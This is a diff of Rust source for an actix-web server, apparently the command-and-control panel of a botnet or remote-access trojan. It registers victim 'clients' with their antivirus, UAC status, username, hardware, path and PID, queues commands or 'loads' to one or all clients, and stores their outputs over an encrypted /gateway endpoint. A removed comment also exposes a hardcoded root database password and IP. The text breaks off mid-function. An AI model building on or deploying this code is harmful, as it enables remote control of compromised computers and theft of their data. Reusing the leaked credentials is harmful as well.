@@ -1,47 +1,49 @@
 extern crate openssl;
 extern crate colored; 
-use actix_web::web::BufMut;
+
 use actix_web::{
-    post,
-    App, HttpResponse, 
+    post, App, HttpResponse, 
     HttpServer, Responder, 
-    HttpRequest,
-    http::StatusCode,
+    HttpRequest, http::StatusCode, 
     web
 };
 
-use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
-use std::io::Read;
-use std::process::exit;
 use std::{
     time::SystemTime, 
     time::UNIX_EPOCH, 
     fs, str, fs::File,
-    io::Write
+    io::Write, process::exit,
+    io::Read, net::IpAddr,
+    process::Command,
+    path::Path, 
+    sync::{Arc, RwLock}
+
 };
 
-use openssl::symm::{Cipher, Crypter, Mode};
-use openssl::error::ErrorStack;
-use openssl::base64::{decode_block, encode_block};
+use openssl::{
+    error::ErrorStack,
+    base64::{decode_block, encode_block},
+    symm::{Cipher, Crypter, Mode},
+
+};
+
+use rsa::{
+    {Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey},
+    pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey},
+    pkcs1::EncodeRsaPublicKey
+};
+
+use mysql_async::{*, prelude::*};
+use randomizer::{Charset, Randomizer};
 
 use colored::Colorize;
 use random_string::generate;
+use lazy_static::lazy_static;
 use crate::serde_json::json;
+use maxminddb::geoip2;
 use serde_json;
 use sha256;
-use randomizer::{Charset, Randomizer};
 use rand;
-use mysql_async::*;
-use mysql_async::prelude::*;
-use std::path::Path;
-use std::process::Command;
-
-use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
-use rsa::pkcs1::EncodeRsaPublicKey;
-use std::net::IpAddr;
-use maxminddb::geoip2;
-use lazy_static::lazy_static;
-use std::sync::{Arc, RwLock};
 
 lazy_static! {
     static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
@@ -52,664 +54,6 @@ lazy_static! {
     static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new( RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
 }
 
-/*
-const API_SECRET: &str = "Pt~a[=-#Z8C+Bv:q5WQ*pD";
-const DB_URL: &str = "mysql://root:r39H)jfd!01JD@213.248.43.36:3306/mydb";
-
-const CONNECTION_INTERVAL: u64 = 60;
-const HONOR_CLIENT_BLOCKS: bool = false;
-*/
-
-#[derive(Debug)]
-enum GenericError {
-    Mysql(Error),
-    NoRows,
-    _WrongData,
-    _ProgramErrored,
-    _Expired
-}
-
-// ------------------------ DB functions ------------------------
-
-async fn obtain_connection() -> Conn {
-    return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
-} 
-
-async fn is_client(connection: &mut Conn, client_id: &String) -> bool {
-
-    let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
-        r"SELECT client_id FROM clients WHERE client_id = :client_id",
-        params! {
-            "client_id" => client_id,
-        }
-    ).await;
-
-    match client_query {
-        Ok(None) => false,
-        Ok(_) => true,
-        Err(e) => {
-            fprint("error", &format!(
-                "At is_client: {}", 
-                e
-            ));
-            false
-        },
-    }
-}
-
-
-async fn is_load(connection: &mut Conn, load_id: &String) -> bool { 
-
-    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
-        r"SELECT load_id FROM loads WHERE load_id = :load_id",
-        params! {
-            "load_id" => load_id,
-        }
-    ).await;
-
-    match load_query {
-        Ok(None) => false,
-        Ok(_) => true,
-        Err(e) => {
-            fprint("error", &format!("At is_load: {}", e));
-            false
-        },
-    }
-}
-
-
-async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
-    let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
-        r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
-        params! {
-            "last_seen" => get_timestamp(),
-            "client_id" => client_id
-        }
-    ).await;
-}
-
-async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {
-
-    let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
-        r"SELECT last_seen FROM clients WHERE client_id = :client_id",
-        params! {
-            "client_id" => &client_id,
-        }
-    ).await;
-
-    match last_seen_query {
-        Ok(None) =>  {
-            return 0
-        },
-        
-        Ok(_) =>  {
-            last_seen_query.unwrap().unwrap()
-        },
-
-        Err(e) => {
-            fprint("error", &format!("At get_last_seen: {}", e));
-            return 0
-        },
-    }
-}
-
-async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {
-
-    let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
-        r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
-        params! {
-            "client_id" => &client_id,
-        }
-    ).await;
-
-    // TODO: Check for encryption key validity. If it's invalid, return error.
-
-    match encryption_key_query {
-        Ok(None) =>  { Err(GenericError::NoRows) },
-        Ok(_) =>  { 
-            let raw_key = encryption_key_query.unwrap().unwrap();
-            let split_key: Vec<&str> = raw_key.split(".").collect();
-            let current_time = get_timestamp();
-            // if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
-
-            if 
-                current_time >= split_key[1].parse::<u64>().unwrap() && 
-                (get_last_seen(connection, &client_id).await + *CONNECTION_INTERVAL.read().unwrap()) <= current_time
-            {
-                return Err(GenericError::_Expired)
-            } else {
-                return Ok(String::from(split_key[0]))
-            }
-        },
-
-        Err(e) => {
-            fprint("error", &format!(
-                "At get_encryption_key: {}", 
-                e
-            ));
-            Err(GenericError::Mysql(e))
-        }
-    }
-}
-
-
-
-// TODO: Fix this fucking horrible code
-async fn block_client(connection: &mut Conn, client_id: &String, ip: &String, duration: u64) -> bool {
-   let banned_until = get_timestamp() + duration;
-
-   #[derive(Debug, PartialEq, Eq)]
-   struct Block {
-       client_id: String,
-       ip: String,
-       banned_until: u64,
-   }
-
-
-   // TODO: Replace the struct with =>
-
-    let result = connection.exec_batch(
-    r"INSERT INTO blocks (client_id, ip, banned_until) VALUES (:client_id, :ip, :banned_until)",
-    vec![
-        Block {
-            client_id: client_id.clone(),
-            ip: ip.clone(),
-            banned_until: banned_until,
-        }
-    ].iter().map(|p: &Block| params! {
-            "client_id" => &p.client_id,
-            "ip" => &p.ip,
-            "banned_until" => &p.banned_until
-
-        })
-    ).await;
-
-    match result {
-        Ok(_) => true,
-        Err(e) => {
-            fprint("error", &format!(
-                "(block_client): {}", 
-                e
-            ));
-            false
-        }
-    }
-
-   
-}
-
-
-async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &String) -> bool {
-    let honor_client_blocks = *HONOR_CLIENT_BLOCKS.read().unwrap();
-
-    if !honor_client_blocks {return false;}
-
-    let blocked_client_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
-        r"SELECT banned_until FROM blocks WHERE client_id = :client_id OR ip = :ip",
-        params! {
-            "client_id" => &client_id,
-            "ip" => &ip,
-        }
-    ).await;
-
-    match blocked_client_query {
-        Ok(None) => false,
-        Ok(_) =>  {
-            if blocked_client_query.unwrap().unwrap() < get_timestamp() {
-
-                let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
-                    r"DELETE FROM blocks WHERE client_id = :client_id OR ip = :ip",
-                    params! {
-                        "client_id" => &client_id,
-                        "ip" => &ip,
-                    }
-                ).await;
-
-                false
-            } else {
-                true
-            }
-        },
-        Err(e) => {
-            fprint("error", &format!(
-                "At is_client_blocked: {}", 
-                e
-            ));
-            false
-        },
-    }
-}
-
-async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
-
-
-    let mut connection:Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
-    let mut connection2: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
-    
-    let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
-    drop(connection2);
-
-    connection.query_drop("START TRANSACTION").await.unwrap();
-
-    for row in selected_clients.unwrap() {       
-
-        let command_id = generate(8, "abcdef123456789");
-        let client_id = value_to_str(&row, 0);
-
-        let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
-            r"
-            INSERT INTO commands (
-                command_id, client_id, load_id,
-                cmd_type, cmd_args, 
-                time_issued
-            ) VALUES (
-                :command_id, :client_id, :load_id,
-                :cmd_type, :cmd_args,
-                :time_issued
-            )",
-            params! {
-                "command_id" => &command_id,
-                "client_id" => &client_id,
-                "load_id" => &load_id,
-                "cmd_type" => &cmd_type,
-                "cmd_args" => &cmd_args,
-                "time_issued" => get_timestamp(),
-            }
-        ).await;
-    
-        match command_insert_sql {
-            Ok(_) => (),
-            Err(e) => {
-                fprint("error", &format!("Tasking all clients failed: {}", e));
-                panic!()
-            }
-        }
-    }
-    connection.query_drop("COMMIT").await.unwrap();
-}
-
-async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
-    let command_id = generate(8, "abcdef123456789");
-    let task_client_sql_success = connection.exec_drop(  
-        r"
-        INSERT INTO commands (
-            command_id, client_id, cmd_type,
-            cmd_args, time_issued
-        ) VALUES (
-            :command_id, :client_id, :cmd_type, :cmd_args, :time_issued
-        )",
-        params! {
-            "command_id" => &command_id,
-            "client_id" => &client_id,
-            "cmd_type" => &cmd_type,
-            "cmd_args" => &cmd_args,
-            "time_issued" => get_timestamp(),
-        }
-    ).await;
-
-    match task_client_sql_success {
-        Ok(_) => true,
-        Err(e) => {
-            fprint("error", &format!(
-                "(task_client): {}", 
-                e
-            ));
-            false
-        }
-    }
-}
-
-async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> std::result::Result<(String, String, String), GenericError> {
-    
-    let command_fetch_sql = connection.exec_first(
-        r"SELECT command_id, cmd_args, cmd_type FROM commands WHERE client_id = :client_id",
-        params! {
-            "client_id" => client_id,
-        }
-    ).await;
-
-    match command_fetch_sql {
-
-        Ok(None) => {
-            Err(GenericError::NoRows)
-        },
-        Ok(_) => {
-            let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
-            Ok((
-                unwrapped.0,
-                unwrapped.1,
-                unwrapped.2,
-            ))
-        },
-        Err(e) => {
-
-            fprint("error", &format!(
-                "At get_current_client_command: {}", 
-                &e
-            ));            
-            Err(GenericError::Mysql(e))
-        }
-    }
-}
-
-async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::result::Result<(String, String, String, u64), GenericError> {
-
-    let command_fetch_sql = connection.exec_first(
-        r"SELECT command_id, cmd_args, cmd_type, time_issued FROM commands WHERE command_id = :command_id",
-        params! {
-            "command_id" => command_id,
-        }
-    ).await;
-
-    match command_fetch_sql {
-       
-        Ok(_) => {
-            let unwrapped: (String, String, String, u64) = command_fetch_sql.unwrap().unwrap();
-            Ok((
-                unwrapped.0,
-                unwrapped.1,
-                unwrapped.2,
-                unwrapped.3,
-            ))
-        },
-        Err(e) => {
-            fprint("error", &format!(
-                "At get_current_client_command: {}", 
-                &e
-            ));            
-            Err(GenericError::Mysql(e))
-        }
-    }
-
-}
-
-async fn is_command(connection: &mut Conn, command_id: &String, client_id: &String) -> bool {
-
-    let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
-        r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
-        params! {
-            "client_id" => client_id,
-            "command_id" => command_id,
-        }
-    ).await;
-    
-    match command_query {
-        Ok(None) => false,
-        Ok(_) => true,
-        Err(e) => {
-            fprint("error", &format!(
-                "At is_command: {}", 
-                e
-            ));
-            false
-        },
-    }
-}
-
-async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id: &String) -> bool {
-    let loads_query_sql = connection.exec_drop(
-        r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
-        params! {
-            "client_id" => &client_id,
-            "load_id" => &load_id,
-        }
-    ).await;
-
-    match loads_query_sql {
-        Ok(_) => true,
-        Err(ref e) => {
-            fprint("error", &format!(
-                "(is_uncompleted_load): {}", 
-                e
-            ));
-            false
-        }
-    }
-}
-
-
-// ------------------------ General Functions ------------------------
-
-
-fn get_timestamp() -> u64 {
-    let since_the_epoch = SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .expect("Time went backwards lmao");
-    return since_the_epoch.as_secs()
-}
-
-fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
-    let cipher = Cipher::aes_256_cbc();
-
-    let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
-    encrypter.pad(true);
-
-    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];
-    let count = encrypter.update(plaintext.as_bytes(), &mut ciphertext)?;
-    let final_count = encrypter.finalize(&mut ciphertext[count..])?;
-
-    ciphertext.truncate(count + final_count);
-    Ok(encode_block(&ciphertext))
-}
-
-
-fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
-    let ciphertext = decode_block(ciphertext).unwrap();
-    let cipher = Cipher::aes_256_cbc();
-    let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
-    decrypter.pad(true);
-
-    let mut plaintext = vec![0; ciphertext.len() + cipher.block_size()];
-    let count = decrypter.update(&ciphertext, &mut plaintext)?;
-    let final_count = decrypter.finalize(&mut plaintext[count..])?;
-
-    plaintext.truncate(count + final_count);
-    Ok(plaintext)
-}
-
-fn fprint(stype: &str, sformatted: &str) -> () {
-    
-    let color = match stype {
-        "info" => stype.to_uppercase().cyan(),
-        "error" => stype.to_uppercase().red(),
-        "failure" => stype.to_uppercase().red(),
-        "success" => stype.to_uppercase().green(),
-        "task" => stype.to_uppercase().yellow(),
-        _ => stype.to_uppercase().white(),
-    };
-
-    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
-}
-
-
-fn value_to_str(row: &mysql_async::Row, index: usize) -> String {
-    if let Some(value) = row.as_ref(index) {
-        match value {
-            Value::NULL => String::from(""),
-            Value::Bytes(v) => String::from_utf8_lossy(v.as_slice()).into_owned(),
-            Value::Int(v) => format!("{v}"),
-            Value::UInt(v) => format!("{v}"),
-            Value::Float(v) => format!("{v}"),
-            Value::Double(v) => format!("{v}"),
-            Value::Date(_year, _month, _day, _hour, _minutes, _seconds, _micro) => todo!(),
-            Value::Time(_negative, _days, _hours, _minutes, _seconds, _micro) => todo!(),
-        }
-    } else {
-        String::from("")
-    }
-}
-
-fn value_to_u64(row: &mysql_async::Row, index: usize) -> u64 {return value_to_str(row, index).parse::<u64>().unwrap();}
-fn value_to_bool(row: &mysql_async::Row, index: usize) -> bool { match value_to_u64(row, index) {1 => true, 0 => false, _ => panic!("Not a bool")} }
-
-fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
-fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
-fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
-fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}
-
-fn all_keys_valid(json: &serde_json::Value, keys: Vec<&str>, types: Vec<&str>) -> bool {
-    let mut counter: usize = 0;
-    for key in keys {
-        if let Some(_) = json.get(key) {
-            // Check if key is one of the valid types:
-            if types[counter] == "String" {
-                match json[key].as_str() {
-                    Some(_) => (),
-                    None => return false,
-                };
-            } else if types[counter] == "u64" {
-                match json[key].as_u64() {
-                    Some(_) => (),
-                    None => return false,
-                };
-            } else if types[counter] == "bool" {
-                match json[key].as_bool() {
-                    Some(_) => (),
-                    None => return false,
-                };
-            }
-        } else {
-            return false;
-        }
-        counter += 1;
-    }
-    return true
-}
-
-async fn ip_to_country(ip: &str) -> String {
-    let ip_db = &*IP_DATABASE.read().unwrap();
-    let reader = maxminddb::Reader::from_source(ip_db).unwrap();
-    let ip: IpAddr = ip.parse().unwrap();
-    let country: std::prelude::v1::Result<geoip2::Country, maxminddb::MaxMindDBError> = reader.lookup(ip);
-    match country {
-        Ok(_) => String::from(country.unwrap().country.unwrap().iso_code.unwrap()),
-        Err(_) => String::from("NL")
-    }
-}
-
-
-// ------------------------ HTTP Responses ------------------------
-
-fn resp_unauthorised() -> HttpResponse {
-    return HttpResponse::build(StatusCode::UNAUTHORIZED).body("You do not have the required authorization to complete this request.");
-}
-
-fn resp_badrequest() -> HttpResponse {
-    return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
-}
-
-fn resp_servererror() -> HttpResponse {
-    return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
-}
-
-fn resp_ok(message: String) -> HttpResponse {
-    return HttpResponse::build(StatusCode::OK).body(message);
-}
-
-fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
-    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).unwrap());
-}
-
-// ------------------------ Init Functions ------------------------
-
-
-async fn initialize_tables(connection_pool: Pool) {
-    let mut connection: Conn = connection_pool.get_conn().await.expect("Unable to connect to database.");
-
-    connection.query_drop(r"
-    
-        SET GLOBAL query_cache_size = 268435455;
-
-    ").await.expect("Failed to init db");
-
-    connection.query_drop(
-        r"
-        CREATE TABLE IF NOT EXISTS clients (
-            client_id TEXT,
-            version INTEGER,
-            uac BOOL,
-            ip TEXT,
-            country TEXT,
-            username TEXT,
-            guid TEXT,
-            cpu TEXT,
-            gpu TEXT,
-            ram INTEGER,
-            antivirus TEXT,
-            path TEXT,
-            pid INTEGER,
-            last_seen INTEGER,
-            first_seen INTEGER,
-            encryption_key TEXT
-        )  ENGINE=InnoDB;
-    
-        CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
-        ").await.expect("clients table creation failed");
-    
-    connection.query_drop(
-        r"
-        CREATE TABLE IF NOT EXISTS commands (
-            command_id TEXT,
-            load_id TEXT,
-            client_id TEXT,
-            cmd_type TEXT,
-            cmd_args TEXT,
-            time_issued INT
-        ) ENGINE=InnoDB;
-    
-        CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands (client_id);
-        CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands (command_id);
-
-        ").await.expect("commands table creation failed");
-    
-    connection.query_drop(
-        r"
-        CREATE TABLE IF NOT EXISTS outputs (
-            output_id TEXT,
-            command_id TEXT,
-            client_id TEXT,
-            cmd_args TEXT,
-            cmd_type TEXT,
-            output TEXT,
-            time_issued INT,
-            time_received INT
-        ) ENGINE=InnoDB;
-    
-        CREATE INDEX IF NOT EXISTS idx_outputs_client_id ON outputs (client_id);
-        CREATE INDEX IF NOT EXISTS idx_outputs_command_id ON outputs (command_id);
-        CREATE INDEX IF NOT EXISTS idx_outputs_output_id ON outputs (output_id);
-        ").await.expect("outputs table creation failed");
-    
-    connection.query_drop(
-        r"
-        CREATE TABLE IF NOT EXISTS loads (
-            load_id TEXT,
-            required_amount INT,
-            recursive_load BOOL,
-            cmd_args TEXT,
-            cmd_type TEXT,
-            time_issued INT
-        ) ENGINE=InnoDB;
-    
-        CREATE INDEX IF NOT EXISTS idx_loads_load_id ON loads (load_id);
-        ").await.expect("loads table creation failed");
-    
-    connection.query_drop(
-        r"
-        CREATE TABLE IF NOT EXISTS blocks (
-            client_id TEXT,
-            ip TEXT,
-            banned_until INT
-        ) ENGINE=InnoDB;
-    
-        CREATE INDEX IF NOT EXISTS idx_blocks_client_id ON blocks (client_id);
-        CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
-        ").await.expect("blocks table creation failed");
-    
-    drop(connection);
-}
-
-// ------------------------ Main Program ------------------------
 
 #[post("/gateway")]
 async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
@@ -1470,7 +814,6 @@ async fn main() -> std::io::Result<()> {
         format!("http://{}/gateway", &key_to_string(&parsed_json_config, "host")).yellow()
     ));
 
-    
     HttpServer::new(move || {
         App::new()
             .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb
@@ -1485,4 +828,657 @@ async fn main() -> std::io::Result<()> {
     .bind(&key_to_string(&parsed_json_config, "host"))? 
     .run()
     .await
+}
+
+
+// ------------------------ DB functions ------------------------
+
+async fn obtain_connection() -> Conn {
+    return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
+} 
+
+async fn is_client(connection: &mut Conn, client_id: &String) -> bool {
+
+    let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
+        r"SELECT client_id FROM clients WHERE client_id = :client_id",
+        params! {
+            "client_id" => client_id,
+        }
+    ).await;
+
+    match client_query {
+        Ok(None) => false,
+        Ok(_) => true,
+        Err(e) => {
+            fprint("error", &format!(
+                "At is_client: {}", 
+                e
+            ));
+            false
+        },
+    }
+}
+
+
+async fn is_load(connection: &mut Conn, load_id: &String) -> bool { 
+
+    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
+        r"SELECT load_id FROM loads WHERE load_id = :load_id",
+        params! {
+            "load_id" => load_id,
+        }
+    ).await;
+
+    match load_query {
+        Ok(None) => false,
+        Ok(_) => true,
+        Err(e) => {
+            fprint("error", &format!("At is_load: {}", e));
+            false
+        },
+    }
+}
+
+
+async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
+    let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
+        r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
+        params! {
+            "last_seen" => get_timestamp(),
+            "client_id" => client_id
+        }
+    ).await;
+}
+
+async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {
+
+    let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
+        r"SELECT last_seen FROM clients WHERE client_id = :client_id",
+        params! {
+            "client_id" => &client_id,
+        }
+    ).await;
+
+    match last_seen_query {
+        Ok(None) =>  {
+            return 0
+        },
+        
+        Ok(_) =>  {
+            last_seen_query.unwrap().unwrap()
+        },
+
+        Err(e) => {
+            fprint("error", &format!("At get_last_seen: {}", e));
+            return 0
+        },
+    }
+}
+
+async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {
+
+    let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
+        r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
+        params! {
+            "client_id" => &client_id,
+        }
+    ).await;
+
+    // TODO: Check for encryption key validity. If it's invalid, return error.
+
+    match encryption_key_query {
+        Ok(None) =>  { Err(GenericError::NoRows) },
+        Ok(_) =>  { 
+            let raw_key = encryption_key_query.unwrap().unwrap();
+            let split_key: Vec<&str> = raw_key.split(".").collect();
+            let current_time = get_timestamp();
+            // if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
+
+            if 
+                current_time >= split_key[1].parse::<u64>().unwrap() && 
+                (get_last_seen(connection, &client_id).await + *CONNECTION_INTERVAL.read().unwrap()) <= current_time
+            {
+                return Err(GenericError::_Expired)
+            } else {
+                return Ok(String::from(split_key[0]))
+            }
+        },
+
+        Err(e) => {
+            fprint("error", &format!(
+                "At get_encryption_key: {}", 
+                e
+            ));
+            Err(GenericError::Mysql(e))
+        }
+    }
+}
+
+
+
+// TODO: Fix this fucking horrible code
+async fn block_client(connection: &mut Conn, client_id: &String, ip: &String, duration: u64) -> bool {
+   let banned_until = get_timestamp() + duration;
+
+   #[derive(Debug, PartialEq, Eq)]
+   struct Block {
+       client_id: String,
+       ip: String,
+       banned_until: u64,
+   }
+
+
+   // TODO: Replace the struct with =>
+
+    let result = connection.exec_batch(
+    r"INSERT INTO blocks (client_id, ip, banned_until) VALUES (:client_id, :ip, :banned_until)",
+    vec![
+        Block {
+            client_id: client_id.clone(),
+            ip: ip.clone(),
+            banned_until: banned_until,
+        }
+    ].iter().map(|p: &Block| params! {
+            "client_id" => &p.client_id,
+            "ip" => &p.ip,
+            "banned_until" => &p.banned_until
+
+        })
+    ).await;
+
+    match result {
+        Ok(_) => true,
+        Err(e) => {
+            fprint("error", &format!(
+                "(block_client): {}", 
+                e
+            ));
+            false
+        }
+    }
+
+   
+}
+
+
+async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &String) -> bool {
+    let honor_client_blocks = *HONOR_CLIENT_BLOCKS.read().unwrap();
+
+    if !honor_client_blocks {return false;}
+
+    let blocked_client_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
+        r"SELECT banned_until FROM blocks WHERE client_id = :client_id OR ip = :ip",
+        params! {
+            "client_id" => &client_id,
+            "ip" => &ip,
+        }
+    ).await;
+
+    match blocked_client_query {
+        Ok(None) => false,
+        Ok(_) =>  {
+            if blocked_client_query.unwrap().unwrap() < get_timestamp() {
+
+                let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
+                    r"DELETE FROM blocks WHERE client_id = :client_id OR ip = :ip",
+                    params! {
+                        "client_id" => &client_id,
+                        "ip" => &ip,
+                    }
+                ).await;
+
+                false
+            } else {
+                true
+            }
+        },
+        Err(e) => {
+            fprint("error", &format!(
+                "At is_client_blocked: {}", 
+                e
+            ));
+            false
+        },
+    }
+}
+
+async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
+
+
+    let mut connection:Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
+    let mut connection2: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
+    
+    let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
+    drop(connection2);
+
+    connection.query_drop("START TRANSACTION").await.unwrap();
+
+    for row in selected_clients.unwrap() {       
+
+        let command_id = generate(8, "abcdef123456789");
+        let client_id = value_to_str(&row, 0);
+
+        let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
+            r"
+            INSERT INTO commands (
+                command_id, client_id, load_id,
+                cmd_type, cmd_args, 
+                time_issued
+            ) VALUES (
+                :command_id, :client_id, :load_id,
+                :cmd_type, :cmd_args,
+                :time_issued
+            )",
+            params! {
+                "command_id" => &command_id,
+                "client_id" => &client_id,
+                "load_id" => &load_id,
+                "cmd_type" => &cmd_type,
+                "cmd_args" => &cmd_args,
+                "time_issued" => get_timestamp(),
+            }
+        ).await;
+    
+        match command_insert_sql {
+            Ok(_) => (),
+            Err(e) => {
+                fprint("error", &format!("Tasking all clients failed: {}", e));
+                panic!()
+            }
+        }
+    }
+    connection.query_drop("COMMIT").await.unwrap();
+}
+
+async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
+    let command_id = generate(8, "abcdef123456789");
+    let task_client_sql_success = connection.exec_drop(  
+        r"
+        INSERT INTO commands (
+            command_id, client_id, cmd_type,
+            cmd_args, time_issued
+        ) VALUES (
+            :command_id, :client_id, :cmd_type, :cmd_args, :time_issued
+        )",
+        params! {
+            "command_id" => &command_id,
+            "client_id" => &client_id,
+            "cmd_type" => &cmd_type,
+            "cmd_args" => &cmd_args,
+            "time_issued" => get_timestamp(),
+        }
+    ).await;
+
+    match task_client_sql_success {
+        Ok(_) => true,
+        Err(e) => {
+            fprint("error", &format!(
+                "(task_client): {}", 
+                e
+            ));
+            false
+        }
+    }
+}
+
+async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> std::result::Result<(String, String, String), GenericError> {
+    
+    let command_fetch_sql = connection.exec_first(
+        r"SELECT command_id, cmd_args, cmd_type FROM commands WHERE client_id = :client_id",
+        params! {
+            "client_id" => client_id,
+        }
+    ).await;
+
+    match command_fetch_sql {
+
+        Ok(None) => {
+            Err(GenericError::NoRows)
+        },
+        Ok(_) => {
+            let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
+            Ok((
+                unwrapped.0,
+                unwrapped.1,
+                unwrapped.2,
+            ))
+        },
+        Err(e) => {
+
+            fprint("error", &format!(
+                "At get_current_client_command: {}", 
+                &e
+            ));            
+            Err(GenericError::Mysql(e))
+        }
+    }
+}
+
+async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::result::Result<(String, String, String, u64), GenericError> {
+
+    let command_fetch_sql = connection.exec_first(
+        r"SELECT command_id, cmd_args, cmd_type, time_issued FROM commands WHERE command_id = :command_id",
+        params! {
+            "command_id" => command_id,
+        }
+    ).await;
+
+    match command_fetch_sql {
+       
+        Ok(_) => {
+            let unwrapped: (String, String, String, u64) = command_fetch_sql.unwrap().unwrap();
+            Ok((
+                unwrapped.0,
+                unwrapped.1,
+                unwrapped.2,
+                unwrapped.3,
+            ))
+        },
+        Err(e) => {
+            fprint("error", &format!(
+                "At get_current_client_command: {}", 
+                &e
+            ));            
+            Err(GenericError::Mysql(e))
+        }
+    }
+
+}
+
+async fn is_command(connection: &mut Conn, command_id: &String, client_id: &String) -> bool {
+
+    let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
+        r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
+        params! {
+            "client_id" => client_id,
+            "command_id" => command_id,
+        }
+    ).await;
+    
+    match command_query {
+        Ok(None) => false,
+        Ok(_) => true,
+        Err(e) => {
+            fprint("error", &format!(
+                "At is_command: {}", 
+                e
+            ));
+            false
+        },
+    }
+}
+
+async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id: &String) -> bool {
+    let loads_query_sql = connection.exec_drop(
+        r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
+        params! {
+            "client_id" => &client_id,
+            "load_id" => &load_id,
+        }
+    ).await;
+
+    match loads_query_sql {
+        Ok(_) => true,
+        Err(ref e) => {
+            fprint("error", &format!(
